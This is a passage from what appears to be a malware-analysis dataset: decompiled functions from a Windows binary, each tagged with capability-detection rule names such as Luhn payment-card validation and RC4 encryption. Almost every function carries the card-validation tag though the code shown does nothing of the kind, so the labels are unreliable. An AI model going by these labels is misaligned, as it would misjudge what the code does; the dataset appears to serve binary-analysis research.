        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0043aefb(uint arg_8h, uint arg_ch)\n\n{\n    uint arg_8h_00;\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    uint var_4h;\n    \n    fcn.004627af(0);\n    pcVar1 = _sym.imp.OLEAUT32.dll_VariantInit;\n    arg_8h_00 = *(unaff_EBP + 0xc);\n    *(unaff_EBP + -4) = 0;\n    uVar2 = (*pcVar1)(arg_8h_00);\n    fcn.00410320(uVar2);\n    iVar3 = (*pcVar1)(arg_8h_00);\n    if (iVar3 != 0) {\n        iVar3 = (*pcVar1)(arg_8h_00);\n        fcn.00429fd7(arg_8h_00, iVar3 * 2);\n    }\n    (*_sym.imp.OLEAUT32.dll_SysStringLen)(arg_8h_00);\n    fcn.00462887();\n    return;\n}\n",
        "token_count": 271
    },
    "0043afa8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0043afa8(uint32_t *param_1, int32_t *param_2, uint32_t *param_3)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    \n    uVar1 = param_1[2];\n    iVar4 = 2;\n    param_2[1] = 0;\n    *param_2 = 0;\n    param_2[2] = 0;\n    if ((((uVar1 != 2) && (param_3[2] != 2)) && (iVar4 = 1,  uVar1 != 1)) && (param_3[2] != 1)) {\n        uVar3 = param_3[1] + param_1[1] + CARRY4(*param_3, *param_1);\n        uVar1 = param_1[1];\n        *param_2 = *param_3 + *param_1;\n        uVar2 = param_3[1];\n        param_2[1] = uVar3;\n        if (((uVar2 ^ uVar1) & 0x80000000) != 0) {\n            return;\n        }\n        if (((uVar3 ^ uVar1) & 0x80000000) == 0) {\n            return;\n        }\n    }\n    param_2[2] = iVar4;\n    return;\n}\n",
        "token_count": 326
    },
    "0043b4f9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_1ch\n\nvoid __cdecl fcn.0043b4f9(uchar *arg_8h, uint pdateOut, uint lcid)\n\n{\n    char cVar1;\n    uint arg_8h_00;\n    int32_t iVar2;\n    uchar *puVar3;\n    int32_t iVar4;\n    ulong *in_ECX;\n    uchar *puStack36;\n    uint var_1ch;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x4b8030 ^ &stack0xfffffffc;\n    puStack36 = 0x43b514;\n    arg_8h_00 = (**0x4b94e8)();\n    var_8h = 0;\n    if (arg_8h == NULL) {\n        arg_8h = 0x4939a0;\n    }\n    puVar3 = &stack0xffffffdc;\n    puStack36 = arg_8h;\n    var_ch = (*_sym.imp.KERNEL32.dll_lstrlenA)();\n    var_ch = var_ch + 1;\n    iVar2 = fcn.004010b0(&fcn.0043b4f9::var_ch, var_ch, 2);\n    iVar4 = var_ch;\n    if (iVar2 < 0) {\ncode_r0x0043b57e:\n        *(in_ECX + 1) = 1;\n        *in_ECX = 0;\n    }\n    else {\n        if ((var_ch < 0x401) && (cVar1 = fcn.00401120(var_ch),  cVar1 != '\\0')) {\n            fcn.00462d70();\n        }\n        else {\n            puVar3 = fcn.00402070(iVar4);\n        }\n        puStack36 = puVar3;\n        iVar4 = fcn.00401200();\n        if (iVar4 == 0) goto code_r0x0043b57e;\n        iVar4 = (*_sym.imp.OLEAUT32.dll_VarDateFromDisp)(iVar4, lcid, pdateOut);\n        if (-1 < iVar4) {\n            *(in_ECX + 1) = 0;\ncode_r0x0043b5d8:\n            fcn.004020b0();\n            goto code_r0x0043b593;\n        }\n        if (iVar4 == -0x7ffdfffb) goto code_r0x0043b57e;\n        *in_ECX = *0x498308;\n        *(in_ECX + 1) = 1;\n        if (iVar4 != -0x7ffdfff6) goto code_r0x0043b5d8;\n    }\n    fcn.004020b0();\ncode_r0x0043b593:\n    fcn.0045e747(arg_8h_00);\n    return;\n}\n",
        "token_count": 671
    },
    "0043b80d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_38h\n\nvoid __cdecl fcn.0043b80d(uint arg_8h, uint arg_ch)\n\n{\n    uint *puVar1;\n    uint16_t uVar2;\n    uint *puVar3;\n    code **ppcVar4;\n    code *pcVar5;\n    uint uVar6;\n    int32_t iVar7;\n    int32_t unaff_EBP;\n    uint16_t *puVar8;\n    uint var_38h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_4h;\n    \n    fcn.0046284e(0x30);\n    puVar8 = *(unaff_EBP + 0xc);\n    uVar6 = *(unaff_EBP + 8);\n    uVar2 = *puVar8;\n    *(unaff_EBP + -0x28) = uVar6;\n    *(unaff_EBP + -0x30) = puVar8;\n    if (uVar2 != 0) {\n        (*_sym.imp.OLEAUT32.dll_VariantCopy)(puVar8);\n    }\n    fcn.00410360(puVar8);\n    if ((*puVar8 & 0x6000) != 0) goto code_r0x0043b90f;\n    // switch table (22 cases) at 0x43ba1d\n    switch(*puVar8) {\n    case 2:\n    case 0xb:\n    case 0x12:\n        fcn.00410360(puVar8 + 4);\n        break;\n    case 3:\n    case 10:\n        puVar8 = puVar8 + 4;\n        goto code_r0x0043b87e;\n    case 4:\n        fcn.0043ae12(puVar8 + 4);\n        break;\n    case 5:\n    case 7:\n        fcn.0043ae54(puVar8 + 4);\n        break;\n    case 6:\n        fcn.004103b0(puVar8 + 4);\n        puVar8 = puVar8 + 6;\ncode_r0x0043b87e:\n        fcn.0043ae96(puVar8);\n        break;\n    case 8:\n        fcn.004103b0(unaff_EBP + -0x28);\n        if (*(unaff_EBP + -0x28) == 0) {\n            *(puVar8 + 4) = 0;\n        }\n        else {\n            iVar7 = (*_sym.imp.OLEAUT32.dll_DllRegisterServer)(0, *(unaff_EBP + -0x28));\n            *(puVar8 + 4) = iVar7;\n            if (iVar7 == 0) {\n                iVar7 = fcn.00411e0e();\n            }\n            fcn.00410400(iVar7, *(unaff_EBP + -0x28));\n        }\n        break;\n    case 9:\n    case 0xd:\n        *(unaff_EBP + -0x2c) = 0;\n        fcn.0044b637(uVar6);\n        fcn.004103b0(unaff_EBP + -0x24);\n        fcn.00410360(unaff_EBP + -0x20);\n        fcn.00410360(unaff_EBP + -0x1e);\n        fcn.00410400(unaff_EBP + -0x1c, 8);\n        pcVar5 = _sym.imp.ole32.dll_CoCreateInstance;\n        uVar6 = 0x4a0a08;\n        if (*puVar8 != 0xd) {\n            uVar6 = 0x49ede8;\n        }\n        puVar1 = puVar8 + 4;\n        iVar7 = (*_sym.imp.ole32.dll_CoCreateInstance)(unaff_EBP + -0x24, 0, 0x17, uVar6, puVar1);\n        if (iVar7 == -0x7ff8ffa9) {\n            uVar6 = 0x4a0a08;\n            if (*puVar8 != 0xd) {\n                uVar6 = 0x49ede8;\n            }\n            iVar7 = (*pcVar5)(unaff_EBP + -0x24, 0, 7, uVar6, puVar1);\n        }\n        fcn.0043988c(iVar7);\n        puVar3 = *puVar1;\n        ppcVar4 = *puVar3;\n        *(unaff_EBP + -4) = 0;\n        iVar7 = (**ppcVar4)(puVar3, 0x4a1118, unaff_EBP + -0x2c);\n        if (iVar7 < 0) {\n            iVar7 = (****puVar1)(*puVar1, 0x4a0b78, unaff_EBP + -0x2c);\n        }\n        fcn.0043988c(iVar7);\n        uVar6 = (**(**(unaff_EBP + -0x2c) + 0x14))(*(unaff_EBP + -0x2c), unaff_EBP + -0x38);\n        fcn.0043988c(uVar6);\n        iVar7 = **(unaff_EBP + -0x2c);\n        *(unaff_EBP + -4) = 0xffffffff;\n        (**(iVar7 + 8))(*(unaff_EBP + -0x2c));\n        break;\n    case 0x10:\n    case 0x11:\n        fcn.00429d55(puVar8 + 4);\n        break;\n    case 0x13:\n        fcn.004103b0(puVar8 + 4);\n        break;\n    case 0x14:\n        fcn.0043adca(puVar8 + 4);\n        break;\n    case 0x15:\n        fcn.00429d94(puVar8 + 4);\n    }\ncode_r0x0043b90f:\n    fcn.004628aa();\n    return;\n}\n",
        "token_count": 1474
    },
    "0043bdd8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0043bdd8(uint arg_8h, uint pcyOut, uint lcid)\n\n{\n    uint *puVar1;\n    int32_t arg_8h_00;\n    uint uVar2;\n    uint *in_ECX;\n    \n    puVar1 = fcn.0041442c(arg_8h);\n    arg_8h_00 = (*_sym.imp.OLEAUT32.dll_VarCyFromDisp)(*puVar1, lcid, pcyOut);\n    fcn.00402740();\n    uVar2 = 0;\n    if (arg_8h_00 < 0) {\n        if (arg_8h_00 == -0x7ffdfffb) {\n            in_ECX[1] = 0;\n        }\n        else {\n            if (arg_8h_00 != -0x7ffdfff6) {\n                if (arg_8h_00 == -0x7ff8fff2) {\n                    fcn.00411e0e();\n                }\n                uVar2 = fcn.00413258(arg_8h_00);\n                goto code_r0x0043be49;\n            }\n            in_ECX[1] = 0x80000000;\n        }\n        *in_ECX = 0;\n        in_ECX[2] = 1;\n        uVar2 = 0;\n    }\n    else {\ncode_r0x0043be49:\n        in_ECX[2] = uVar2;\n        uVar2 = 1;\n    }\n    return uVar2;\n}\n",
        "token_count": 344
    },
    "0043c517": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0043c517(int32_t param_1, uint param_2)\n\n{\n    uint uVar1;\n    \n    fcn.0045e756(*(param_1 + 0x54));\n    uVar1 = fcn.00463f63(param_2);\n    *(param_1 + 0x54) = uVar1;\n    fcn.0045e756(*(param_1 + 0x68));\n    uVar1 = fcn.00463f63(*(param_1 + 0x50));\n    *(param_1 + 0x68) = uVar1;\n    return;\n}\n",
        "token_count": 142
    },
    "0043cf30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.0043cf30(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    int32_t arg_14h;\n    int32_t arg_ch_00;\n    uint arg_10h_00;\n    uint uVar2;\n    int32_t unaff_EBP;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.004627af(4);\n    piVar1 = *(unaff_EBP + 0xc);\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -0x10) = 0;\n    uVar2 = fcn.0042652b();\n    fcn.0040f840(uVar2);\n    arg_14h = **(unaff_EBP + 0x10);\n    uVar2 = *(arg_14h + -0xc);\n    arg_ch_00 = *piVar1;\n    arg_10h_00 = *(arg_ch_00 + -0xc);\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -0x10) = 1;\n    fcn.0042654e(*(unaff_EBP + 8), arg_ch_00, arg_10h_00, arg_14h, uVar2);\n    fcn.00462887();\n    return;\n}\n",
        "token_count": 348
    },
    "0043dab4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint __cdecl fcn.0043dab4(uint arg_8h)\n\n{\n    uint16_t *puVar1;\n    int32_t in_ECX;\n    int32_t arg_8h_00;\n    uint var_4h;\n    \n    arg_8h_00 = *(in_ECX + 0x80);\n    if (arg_8h_00 != 0) {\n        puVar1 = (*_sym.imp.KERNEL32.dll_GlobalLock)(arg_8h_00, 0);\n        arg_8h_00 = *puVar1 + puVar1;\n    }\n    fcn.00413f9d(arg_8h_00);\n    return arg_8h;\n}\n",
        "token_count": 172
    },
    "0043dae5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint __cdecl fcn.0043dae5(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    uint var_4h;\n    \n    iVar1 = *(in_ECX + 0x80);\n    if (iVar1 != 0) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_GlobalLock)(iVar1, 0);\n        iVar1 = *(iVar1 + 2) + iVar1;\n    }\n    fcn.00413f9d(iVar1);\n    return arg_8h;\n}\n",
        "token_count": 140
    },
    "0043db17": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint __cdecl fcn.0043db17(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    uint var_4h;\n    \n    iVar1 = *(in_ECX + 0x80);\n    if (iVar1 != 0) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_GlobalLock)(iVar1, 0);\n        iVar1 = *(iVar1 + 4) + iVar1;\n    }\n    fcn.00413f9d(iVar1);\n    return arg_8h;\n}\n",
        "token_count": 140
    },
    "0043db49": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint __cdecl fcn.0043db49(uint arg_8h)\n\n{\n    uint16_t *puVar1;\n    int32_t in_ECX;\n    int32_t arg_8h_00;\n    uint var_4h;\n    \n    arg_8h_00 = *(*(in_ECX + 0x74) + 0xc);\n    if (arg_8h_00 != 0) {\n        puVar1 = (*_sym.imp.KERNEL32.dll_GlobalLock)(arg_8h_00, 0);\n        arg_8h_00 = *puVar1 + puVar1;\n    }\n    fcn.00413f9d(arg_8h_00);\n    return arg_8h;\n}\n",
        "token_count": 177
    },
    "0043db7a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint __cdecl fcn.0043db7a(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    uint var_4h;\n    \n    iVar1 = *(*(in_ECX + 0x74) + 0xc);\n    if (iVar1 != 0) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_GlobalLock)(iVar1, 0);\n        iVar1 = *(iVar1 + 2) + iVar1;\n    }\n    fcn.00413f9d(iVar1);\n    return arg_8h;\n}\n",
        "token_count": 147
    },
    "0043dbac": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint __cdecl fcn.0043dbac(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    uint var_4h;\n    \n    iVar1 = *(*(in_ECX + 0x74) + 0xc);\n    if (iVar1 != 0) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_GlobalLock)(iVar1, 0);\n        iVar1 = *(iVar1 + 4) + iVar1;\n    }\n    fcn.00413f9d(iVar1);\n    return arg_8h;\n}\n",
        "token_count": 146
    },
    "0043dd1a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: phkResult\n\nvoid __cdecl fcn.0043dd1a(uint arg_8h)\n\n{\n    int32_t arg_8h_00;\n    int32_t iVar1;\n    uchar *puVar2;\n    uint phkResult;\n    uint lpName;\n    uint32_t var_4h;\n    \n    var_4h = *0x4b8030 ^ &stack0xfffffffc;\n    arg_8h_00 = fcn.00463f63(arg_8h);\n    if (arg_8h_00 != 0) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_lstrlenA)(arg_8h_00);\n        puVar2 = iVar1 + arg_8h_00;\n        while (puVar2 != NULL) {\n            *puVar2 = 0;\n            fcn.00464dce(arg_8h_00, puVar2);\n            iVar1 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyA)(0x80000000, arg_8h_00, &phkResult);\n            if (iVar1 != 0) break;\n            iVar1 = (*_sym.imp.ADVAPI32.dll_RegEnumKeyA)(phkResult, 0, &lpName, 0x105);\n            (*_sym.imp.ADVAPI32.dll_RegCloseKey)(phkResult);\n            if (iVar1 == 0) break;\n            (*_sym.imp.ADVAPI32.dll_RegDeleteKeyA)(0x80000000, arg_8h_00);\n            puVar2 = fcn.00464d24(arg_8h_00, 0x5c);\n        }\n        fcn.0045e756(arg_8h_00);\n    }\n    fcn.0045e747(phkResult);\n    return;\n}\n",
        "token_count": 408
    },
    "0043e2a5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.0043e2a5(int32_t *param_1, uchar param_2, int32_t param_3)\n\n{\n    int32_t iVar1;\n    \n    if (((-1 < param_3) && (param_3 < *(*param_1 + -0xc))) &&\n       (iVar1 = fcn.00463968(*param_1 + param_3, param_2),  iVar1 != 0)) {\n        return iVar1 - *param_1;\n    }\n    return -1;\n}\n",
        "token_count": 121
    },
    "0043e469": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0043e469(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t *in_ECX;\n    uint var_4h;\n    \n    if (arg_ch < 0) {\n        arg_ch = 0;\n    }\n    iVar1 = *in_ECX;\n    iVar2 = *(iVar1 + -0xc);\n    if (arg_ch < iVar2) {\n        uVar3 = fcn.0042652b();\n        fcn.00428a59((iVar1 - arg_ch) + iVar2, arg_ch, uVar3);\n    }\n    else {\n        fcn.0041d1b4();\n    }\n    return arg_8h;\n}\n",
        "token_count": 176
    },
    "0043fc7d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0043fc7d(void)\n\n{\n    uint uVar1;\n    uint unaff_retaddr;\n    \n    uVar1 = fcn.0040f8a0(0x104);\n    fcn.00462290(uVar1, 0, 0x104);\n    fcn.00411e90(uVar1, 0x104, unaff_retaddr, 0xffffffff);\n    (*_sym.imp.SHLWAPI.dll_PathStripToRootA)(uVar1);\n    fcn.00414de4(0xffffffff);\n    return;\n}\n",
        "token_count": 127
    },
    "004401ba": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004401ba(uint arg_8h, uint *arg_ch)\n\n{\n    uint unaff_ESI;\n    uint var_108h;\n    uint var_104h;\n    uint32_t var_4h;\n    \n    var_4h = *0x4b8030 ^ &stack0xfffffffc;\n    fcn.004634fc(&var_104h, 0x100, \"{%08X-%04X-%04X-%02X%02X-%02X%02X%02X%02X%02X%02X}\", *arg_ch, *(arg_ch + 1), \n                 *(arg_ch + 6), *(arg_ch + 2), *(arg_ch + 9), *(arg_ch + 10), *(arg_ch + 0xb), *(arg_ch + 3), \n                 *(arg_ch + 0xd), *(arg_ch + 0xe), *(arg_ch + 0xf));\n    fcn.00413f9d(&var_104h);\n    fcn.0045e747(unaff_ESI);\n    return;\n}\n",
        "token_count": 240
    },
    "004402be": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.004402be(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    code *pcVar4;\n    int32_t unaff_EBP;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.004627af(4);\n    uVar2 = *(unaff_EBP + 8);\n    puVar1 = *(unaff_EBP + 0x10);\n    *puVar1 = 0;\n    fcn.004401ba(unaff_EBP + -0x10, uVar2);\n    *(unaff_EBP + -4) = 0;\n    uVar2 = fcn.0042407a();\n    fcn.0040f840(uVar2);\n    *(unaff_EBP + -4) = 1;\n    iVar3 = fcn.0043fbcd(*(unaff_EBP + -0x10), unaff_EBP + 0x10);\n    if (iVar3 == 0) {\n        fcn.00402740();\n        fcn.00402740();\n    }\n    else {\n        iVar3 = fcn.00416c12(*(unaff_EBP + 0x10));\n        if ((iVar3 != 0) &&\n           (pcVar4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar3, \"DllGetClassObject\"),  pcVar4 != NULL)) {\n            (*pcVar4)(*(unaff_EBP + 8), *(unaff_EBP + 0xc), puVar1);\n        }\n        fcn.00402740();\n        fcn.00402740();\n    }\n    fcn.00462887();\n    return;\n}\n",
        "token_count": 423
    },
    "00440c43": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00440c43(void)\n\n{\n    int32_t iVar1;\n    uchar auStack36 [36];\n    \n    iVar1 = fcn.00440bfd(auStack36);\n    if (iVar1 == 0) {\n        iVar1 = 0;\n    }\n    else {\n        iVar1 = *(iVar1 + 0x14) + 0x76c;\n    }\n    return iVar1;\n}\n",
        "token_count": 95
    },
    "00440c63": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00440c63(void)\n\n{\n    int32_t iVar1;\n    uchar auStack36 [36];\n    \n    iVar1 = fcn.00440bfd(auStack36);\n    if (iVar1 == 0) {\n        iVar1 = 0;\n    }\n    else {\n        iVar1 = *(iVar1 + 0x10) + 1;\n    }\n    return iVar1;\n}\n",
        "token_count": 92
    },
    "00440c7f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00440c7f(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uchar auStack36 [36];\n    \n    iVar1 = fcn.00440bfd(auStack36);\n    if (iVar1 == 0) {\n        uVar2 = 0;\n    }\n    else {\n        uVar2 = *(iVar1 + 0xc);\n    }\n    return uVar2;\n}\n",
        "token_count": 95
    },
    "00440c9a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00440c9a(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uchar auStack36 [36];\n    \n    iVar1 = fcn.00440bfd(auStack36);\n    if (iVar1 == 0) {\n        uVar2 = 0xffffffff;\n    }\n    else {\n        uVar2 = *(iVar1 + 8);\n    }\n    return uVar2;\n}\n",
        "token_count": 95
    },
    "00440cb6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00440cb6(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uchar auStack36 [36];\n    \n    iVar1 = fcn.00440bfd(auStack36);\n    if (iVar1 == 0) {\n        uVar2 = 0xffffffff;\n    }\n    else {\n        uVar2 = *(iVar1 + 4);\n    }\n    return uVar2;\n}\n",
        "token_count": 94
    },
    "00440cd2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00440cd2(void)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    uchar auStack36 [36];\n    \n    puVar1 = fcn.00440bfd(auStack36);\n    if (puVar1 == NULL) {\n        uVar2 = 0xffffffff;\n    }\n    else {\n        uVar2 = *puVar1;\n    }\n    return uVar2;\n}\n",
        "token_count": 93
    },
    "004413b1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.004413b1(uint32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    if (0x10b < param_1) {\n        if (param_1 == 0x3e3) {\n            return 10;\n        }\n        if (param_1 == 0x3e4) {\n            return 10;\n        }\n        if (param_1 == 0x3e5) {\n            return 10;\n        }\n        if (param_1 == 999) {\n            return 5;\n        }\n        return 1;\n    }\n    if (param_1 == 0x10b) {\n        return 3;\n    }\n    if (param_1 < 0x3f) {\n        if (param_1 == 0x3e) {\n            return 8;\n        }\n        if (param_1 < 0x1a) {\n    // switch table (25 cases) at 0x4415bd\n            switch(param_1) {\n            case 0:\n                return 0;\n            case 1:\n            case 7:\n            case 8:\n            case 9:\n            case 10:\n            case 0xd:\n            case 0xe:\n                goto code_r0x004414e5;\n            case 2:\n            case 6:\n            case 0x12:\n                goto code_r0x004414e5;\n            case 3:\n            case 0xf:\n            case 0x11:\n                goto code_r0x004414e5;\n            case 4:\n                return 4;\n            case 5:\n            case 0xc:\n            case 0x13:\ncode_r0x004414e5:\n                return 5;\n            case 0xb:\ncode_r0x004414e5:\n                return 6;\n            case 0x10:\n                return 7;\n            case 0x14:\n            case 0x15:\n            case 0x16:\n            case 0x17:\ncode_r0x004414e5:\n                return 10;\n            default:\n                goto code_r0x004414e5;\n            }\n        }\n        if (0x27 < param_1) {\n    // switch table (9 cases) at 0x441621\n            switch(param_1) {\n            case 0x34:\n            case 0x35:\n            case 0x37:\n                goto code_r0x004414e5;\n            case 0x36:\n            case 0x3a:\n                goto code_r0x004414e5;\n            default:\n                return 1;\n            case 0x39:\n            case 0x3b:\n                goto code_r0x004414e5;\n            case 0x3c:\n                goto code_r0x004414e5;\n            }\n        }\n        if (param_1 == 0x27) {\n            return 0xd;\n        }\n        if (0x20 < param_1) {\n            if (param_1 == 0x21) {\n                return 0xc;\n            }\n            if (param_1 == 0x22) {\n                return 3;\n            }\n            if (param_1 == 0x24) {\n                return 4;\n            }\n            if (param_1 == 0x26) {\n                return 0xe;\n            }\n            return 1;\n        }\n        if (param_1 == 0x20) {\n            return 0xb;\n        }\n        if (param_1 == 0x1a) {\n            return 6;\n        }\n        if (param_1 == 0x1b) {\n            return 9;\n        }\n        iVar1 = param_1 - 0x1d;\n        if (iVar1 == 0) {\n            return 5;\n        }\ncode_r0x0044142c:\n        if (iVar1 == 1) {\ncode_r0x004414e5:\n            return 9;\n        }\n    }\n    else {\n        if (param_1 < 0x6c) {\n            if (param_1 == 0x6b) {\ncode_r0x004414e5:\n                return 2;\n            }\n            if (0x47 < param_1) {\n                if (param_1 == 0x50) {\n                    return 5;\n                }\n                if (param_1 == 0x52) {\n                    return 5;\n                }\n                if (param_1 == 0x55) {\n                    return 3;\n                }\n                if (param_1 != 0x56) {\n                    if (param_1 == 0x58) {\n                        return 10;\n                    }\n                    return 1;\n                }\n                return 5;\n            }\n            if (param_1 == 0x47) {\n                return 5;\n            }\n            if (param_1 == 0x40) {\n                return 5;\n            }\n            if (param_1 == 0x41) {\n                return 5;\n            }\n            if (param_1 == 0x42) {\n                return 6;\n            }\n            if (param_1 == 0x43) {\n                return 3;\n            }\n            iVar1 = param_1 - 0x44;\n            if (iVar1 == 0) {\n                return 4;\n            }\n        }\n        else {\n            if (param_1 < 0x91) {\n                if (param_1 == 0x90) {\n                    return 3;\n                }\n                if (param_1 < 0x76) {\n                    if (param_1 == 0x75) {\n                        return 10;\n                    }\n                    if (param_1 == 0x6c) {\n                        return 0xc;\n                    }\n                    if (param_1 == 0x6f) {\n                        return 3;\n                    }\n                    if (param_1 == 0x70) {\n                        return 0xd;\n                    }\n                    if (param_1 == 0x71) {\n                        return 4;\n                    }\n                    if (param_1 != 0x72) {\n                        return 1;\n                    }\n                    return 6;\n                }\n                if (param_1 == 0x7b) {\n                    return 3;\n                }\n                if (param_1 == 0x7c) {\n                    return 3;\n                }\n                if (param_1 == 0x7d) {\n                    return 3;\n                }\n                iVar1 = param_1 - 0x83;\n                if (iVar1 == 0) {\n                    return 9;\n                }\n                goto code_r0x0044142c;\n            }\n            if (param_1 < 0xb7) {\n                if (param_1 == 0xb6) {\n                    return 6;\n                }\n                if (param_1 == 0x91) {\n                    return 7;\n                }\n                if (param_1 == 0x9a) {\n                    return 3;\n                }\n                if (param_1 != 0xa1) {\n                    if (param_1 == 0xa7) {\n                        return 0xc;\n                    }\n                    if (param_1 == 0xaa) {\n                        return 5;\n                    }\n                    return 1;\n                }\n                return 3;\n            }\n            if (param_1 == 0xb7) {\n                return 5;\n            }\n            if (param_1 == 0xbf) {\n                return 6;\n            }\n            if (param_1 == 0xc1) {\n                return 6;\n            }\n            iVar1 = param_1 - 0xce;\n            if (iVar1 == 0) {\n                return 3;\n            }\n        }\n        if (iVar1 == 2) {\ncode_r0x004414e5:\n            return 3;\n        }\n    }\ncode_r0x004414e5:\n    return 1;\n}\n",
        "token_count": 1731
    },
    "00442146": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
